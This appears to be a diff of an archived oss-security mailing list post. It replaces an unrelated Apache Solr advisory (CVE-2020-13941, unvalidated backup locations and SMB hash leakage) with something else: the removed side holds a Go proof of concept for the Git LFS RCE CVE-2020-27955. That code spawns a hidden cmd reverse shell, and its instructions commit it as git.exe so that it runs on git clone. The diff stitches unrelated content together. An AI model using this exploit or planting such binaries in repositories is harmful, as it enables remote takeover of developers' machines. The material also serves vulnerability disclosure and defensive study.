@@ -1,103 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/05/1
-Message-ID: <CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>
-Date: Wed, 4 Nov 2020 23:26:40 -0300
-From: Dawid Golunski <dawid@...alhackers.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/15/1
+Message-ID: <CABEwPvGwaijionFNmS7vMCTFkQ20Mp+KTBCp3wr+A02EFjyUrQ@mail.gmail.com>
+Date: Fri, 14 Aug 2020 17:14:08 -0400
+From: David Smiley <dsmiley@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn
+Subject: [CVE-2020-13941] Apache Solr information disclosure vulnerability
 Content-Type: text/plain; charset=utf-8
 
-/*
-   Go PoC exploit for git-lfs -  Remote Code Execution (RCE)
-vulnerability CVE-2020-27955
-   git-lfs-RCE-exploit-CVE-2020-27955.go
+Reported in SOLR-14515 (private) and fixed in SOLR-14561 (public), released
+in Solr version 8.6.0.
+The Replication handler (
+https://lucene.apache.org/solr/guide/8_6/index-replication.html#http-api-commands-for-the-replicationhandler)
+allows commands backup, restore and deleteBackup. Each of these take a
+location parameter, which was not validated, i.e you could read/write to
+any location the solr user can access.
 
-   Discovered by Dawid Golunski
-   https://legalhackers.com
-   https://exploitbox.io
+On a windows system SMB paths such as \\10.0.0.99\share\folder may also be
+used, leading to:
+* The possibility of restoring another SolrCore from a server on the
+network (or mounted remote file system) may lead to:
+** Exposing search index data that the attacker should otherwise not have
+access to
+** Replacing the index data entirely by loading it from a remote file
+system that the attacker controls
 
+* Launching SMB attacks which may result in:
+** The exfiltration of sensitive data such as OS user hashes (NTLM/LM
+hashes),
+** In case of misconfigured systems, SMB Relay Attacks which can lead to
+user impersonation on SMB Shares or, in a worse-case scenario, Remote Code
+Execution
 
-   Affected (RCE exploit):
-   Git / GitHub CLI / GitHub Desktop / Visual Studio / GitKraken /
-SmartGit / SourceTree etc.
-   Basically the whole Windows dev world which uses git.
+The solution implemented to address these issues was to:
+* Restrict the location parameter to trusted paths
+* Prevent remote connection when using Windows UNC Paths
 
-   Usage:
-   Compile: go build git-lfs-RCE-exploit-CVE-2020-27955.go
-   Save & commit as git.exe
+~ David Smiley
+Apache Lucene/Solr Search Developer
+http://www.linkedin.com/in/davidwsmiley
 
-   The payload should get executed automatically on git clone operation.
-   It spawns a reverse shell, or a calc.exe for testing (if it
-couldn't connect).
-
-   An lfs-enabled repository with lfs files may also be needed so that git-lfs
-gets invoked. This can be achieved with:
-
-   git lfs track "*.dat"
-   echo "fat bug file" > lfsdata.dat
-   git add .*
-   git add *
-   git commmit -m 'git-lfs exploit' -a
-
-   Check out the full advisory for details:
-
-   https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html
-   https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html
-
-   PoC video at:
-   https://youtu.be/tlptOf9w274
-
- ** For testing purposes only **
-
-
-*/
-
-package main
-import (
-    "net"
-    "os/exec"
-    "bufio"
-    "syscall"
-)
-
-
-func revsh(host string) {
-
-    c, err := net.Dial("tcp", host)
-    if nil != err {
-    // Conn failed
-        if nil != c {
-            c.Close()
-        }
-        // Calc for testing purposes if no listener available
-        cmd := exec.Command("calc")
-        cmd.Run()
-        return
-    }
-
-    r := bufio.NewReader(c)
-    for {
-        runcmd, err := r.ReadString('\n')
-        if nil != err {
-            c.Close()
-            return
-        }
-        cmd := exec.Command("cmd", "/C", runcmd)
-        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-        out, _ := cmd.CombinedOutput()
-        c.Write(out)
-    }
-}
-
-// Connect to netcat listener on local port 1337
-func main() {
-    revsh("localhost:1337")
-}
-
-
--- 
-Regards,
-Dawid Golunski
-https://legalhackers.com
-https://ExploitBox.io
-t: @dawid_golunski
